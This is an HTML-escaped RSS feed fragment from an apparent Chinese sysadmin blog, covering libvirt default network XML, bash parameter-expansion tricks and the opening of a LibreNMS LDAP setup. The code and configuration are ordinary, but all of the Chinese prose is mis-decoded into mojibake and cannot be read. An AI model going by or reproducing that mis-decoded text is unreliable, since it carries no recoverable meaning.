&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mac&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;f0:00:ac:10:0a:21&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘ç½‘ç»œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ virsh net-edit default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;network&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;default&lt;span class=&#34;nt&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;uuid&amp;gt;&lt;/span&gt;58e86841-ef4b-4d63-bf4f-7888515b8474&lt;span class=&#34;nt&#34;&gt;&amp;lt;/uuid&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;forward&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;mode=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;nat&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;bridge&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;virbr0&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;stp=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;on&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;delay=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;mac&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;address=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;52:54:00:6C:22:2C&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;ip&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;address=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;192.168.122.1&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;netmask=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;255.255.255.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;dhcp&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;range&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;start=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;192.168.122.2&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;end=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;192.168.122.254&amp;#39;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dhcp&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/ip&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/network&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨rangeä¸‹é¢æ¥ä¸€åˆ—&lt;/p&gt;</description>
    </item>
    <item>
      <title>Shellä¸­å˜é‡ã€å­—ç¬¦ä¸²ã€æ•°ç»„ã€å‚æ•°çš„æŠ€å·§</title>
      <link>https://rendoumi.com/posts/20231212-shell/</link>
      <pubDate>Wed, 13 Dec 2023 15:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231212-shell/</guid>
      <description>&lt;p&gt;&lt;strong&gt;å˜é‡å­ä¸²&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;${var} è¿”å›å˜é‡varçš„å†…å®¹ï¼Œå•ç‹¬ä½¿ç”¨æ—¶æœ‰æ²¡æœ‰{}ä¸€æ ·ï¼Œæ··åˆå¤šä¸ªå˜é‡å’Œå¸¸é‡æ—¶ï¼Œç”¨{}ç•Œå®šå˜é‡å&lt;/p&gt;
&lt;p&gt;${#var} è¿”å›å˜é‡varå†…å®¹çš„é•¿åº¦&lt;/p&gt;
&lt;p&gt;${var:offset} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„å­å­—ç¬¦ä¸²ï¼Œoffsetä»0å¼€å§‹&lt;/p&gt;
&lt;p&gt;${var:offset:length} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–é•¿åº¦ä¸ºlengthçš„å­å­—ç¬¦ä¸²&lt;/p&gt;
&lt;p&gt;${var#*.} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦&lt;/p&gt;
&lt;p&gt;${var##*.} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦&lt;/p&gt;
&lt;p&gt;${var%.*} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦&lt;/p&gt;
&lt;p&gt;${var%%.*} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;file.txt.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;#*.&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;txt.tar.gz&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;##*.&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;gz&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%.*&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;file.txt.tar&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%%.*&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;file&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒPatternå’Œè¡¨è¾¾å¼ï¼Œç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/xxx/aaa/file.txt &lt;span class=&#34;c1&#34;&gt;#å‡è®¾xxxä¸ºå½“å‰ç”¨æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä»è·¯å¾„ä¸­è·å–æ–‡ä»¶å&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;##*/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;file.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å°†ç»å¯¹è·¯å¾„è½¬ä¸ºç›¸å¯¹è·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# whoamiæ˜¯è·å–å½“å‰ç”¨æˆ·åï¼Œä½¿ç”¨$()æ‰§è¡Œå­shellï¼Œ$(whoami)å°†å¾—åˆ°xxx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;~&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;#*&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;whoami&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#å†…å®¹ä¸º&amp;#34;~/aaa/file.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;${var/pattern/string} ä½¿ç”¨stringä»£æ›¿ç¬¬ä¸€ä¸ªåŒ¹é…çš„pattern&lt;/p&gt;
&lt;p&gt;${var//pattern/string} ä½¿ç”¨stringä»£æ›¿æ‰€æœ‰åŒ¹é…çš„pattern&lt;/p&gt;
&lt;p&gt;${var,} é¦–å­—æ¯è½¬å°å†™&lt;/p&gt;
&lt;p&gt;${var,,} å…¨éƒ¨è½¬å°å†™&lt;/p&gt;
&lt;p&gt;${var^} é¦–å­—æ¯è½¬å¤§å†™&lt;/p&gt;
&lt;p&gt;${var^^} å…¨éƒ¨è½¬å¤§å†™&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç‰¹æ®Šæ‰©å±•å˜é‡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;${var-word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word&lt;/p&gt;
&lt;p&gt;${var:-word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word&lt;/p&gt;
&lt;p&gt;${var+word} å¦‚æœå˜é‡varæœ‰å€¼ï¼ˆåŒ…æ‹¬ç©ºä¸²&amp;quot;&amp;quot;ï¼‰ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;var1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;foo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;var2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-word&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# å†…å®¹ä¸º&amp;#34;foo&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-word&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# å†…å®¹ä¸º&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var2&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;:-&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# å†…å®¹ä¸º&amp;#34;word&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;${var:+word} å¦‚æœå˜é‡varæœ‰å€¼ä¸”ä¸ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word&lt;/p&gt;
&lt;p&gt;${var=word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word&lt;/p&gt;
&lt;p&gt;${var:=word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word&lt;/p&gt;
&lt;p&gt;${var?word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼&lt;/p&gt;</description>
    </item>
    <item>
      <title>Librenmsä½¿ç”¨ldapè®¤è¯ç”¨æˆ·</title>
      <link>https://rendoumi.com/posts/20231213-librenms_ldap/</link>
      <pubDate>Wed, 13 Dec 2023 11:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231213-librenms_ldap/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬openldapä¸­ç”¨æˆ·å’Œç»„çš„è®¾ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ç”¨æˆ·&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ï¼š&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;People&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;givenName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uidNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gidNumber&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ç»„&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ï¼š&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gidNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memberUID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ°librenmsä¸­ï¼Œ 172.18.31.10&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cd&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;opt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;librenms&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vi&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_mechanism&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ldap&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_server&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;172&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_port&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;389&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
